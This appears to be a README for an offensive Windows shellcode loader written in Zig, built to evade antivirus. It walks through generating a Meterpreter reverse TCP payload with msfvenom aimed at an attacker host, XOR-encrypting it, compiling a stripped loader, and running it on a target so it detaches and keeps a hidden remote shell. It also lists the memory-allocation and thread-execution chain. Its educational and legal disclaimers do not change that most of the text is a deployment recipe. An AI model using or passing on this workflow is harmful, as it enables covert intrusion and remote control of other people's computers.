<div align="center">

<h1>Zig Shellcode Loader</h1>

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue)](https://www.microsoft.com/windows)
[![Language](https://img.shields.io/badge/Language-Zig-orange)](https://ziglang.org/)

*Multi-byte XOR Encryption • Process Detachment • Memory Protection*

</div>

---

## Overview

A proof-of-concept shellcode loader demonstrating advanced evasion techniques for security research. Features external payload loading, process detachment, and multi-byte XOR encryption.

## Features

- **External Payload Loading** - Separates loader from encrypted shellcode
- **Process Detachment** - Spawns independent background process
- **Multi-byte XOR** - 8-byte rotating key encryption
- **Memory Protection** - RW → RX transition (avoids RWX)
- **Cross-compilation** - Build Windows binaries from Linux

## Requirements

- Zig 0.13.0+
- Python 3.6+

## Quick Start

### 1. Generate Shellcode
```bash
$ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=<PORT> -f raw -o shellcode.bin
```

### 2. Encrypt Payload
```bash
$ python3 shellcode_encrypter.py shellcode.bin
```

Output: `data.bin` (encrypted payload)

### 3. Compile Loader
```bash
$ zig build-exe zig_loader.zig -target x86_64-windows -O ReleaseSmall -fstrip -fsingle-threaded
```

### 4. Deploy & Execute

Transfer both `zig_loader.exe` and `data.bin` to target system:

```powershell
PS C:\> .\zig_loader.exe
```

The loader detaches immediately, returning control to the shell while maintaining the connection in the background.

## Architecture
```
loader.exe (clean binary)
    ↓
Reads data.bin (encrypted)
    ↓
XOR decryption
    ↓
VirtualAlloc (RW)
    ↓
Copy shellcode
    ↓
VirtualProtect (RX)
    ↓
CreateProcess (detached)
    ↓
CreateThread → Execute
```

## Customization

### Change XOR Key

Modify the key in both files:

**shellcode_encrypter.py:**
```python
xor_key = [0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]
```

**zig_loader.zig:**
```zig
const xor_key = [_]u8{ 0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0 };
```

## Educational Purpose

This tool demonstrates:
- Shellcode execution techniques
- AV evasion methodologies
- Process manipulation
- Memory management

Intended for:
- Security research
- Authorized penetration testing
- CTF competitions
- Malware analysis training

## Legal Disclaimer

**FOR AUTHORIZED USE ONLY**

This tool is provided for educational and legitimate security testing purposes. Unauthorized access to computer systems is illegal. Users must obtain explicit written authorization before use. The authors assume no liability for misuse.

## License

MIT License - See LICENSE file for details

---

<div align="center">

**⚠️ Use Responsibly • Obtain Authorization • Follow Laws ⚠️**

</div>
